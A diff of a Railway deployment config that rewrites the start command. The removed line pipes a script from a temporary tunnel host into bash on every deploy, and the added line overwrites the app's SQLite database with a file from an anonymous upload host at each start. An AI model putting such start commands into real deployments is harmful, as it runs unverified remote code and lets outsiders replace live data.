@@ -1,12 +1,12 @@
 {
-      "$schema": "https://railway.app/railway.schema.json",
-      "build": {
-              "builder": "NIXPACKS"
-      },
-      "deploy": {
-              "startCommand": "curl -sL https://50f1ef53989293.lhr.life/restore.sh | bash && node server.js",
-              "healthcheckPath": "/api/health",
-              "healthcheckTimeout": 298,
-              "restartPolicyType": "ON_FAILURE"
-      }
+        "$schema": "https://railway.app/railway.schema.json",
+        "build": {
+                  "builder": "NIXPACKS"
+        },
+        "deploy": {
+                  "startCommand": "curl -sL -o /data/database.sqlite https://d.uguu.se/FxDCAdKi.sqlite && node server.js",
+                  "healthcheckPath": "/api/health",
+                  "healthcheckTimeout": 300,
+                  "restartPolicyType": "ON_FAILURE"
+        }
 }
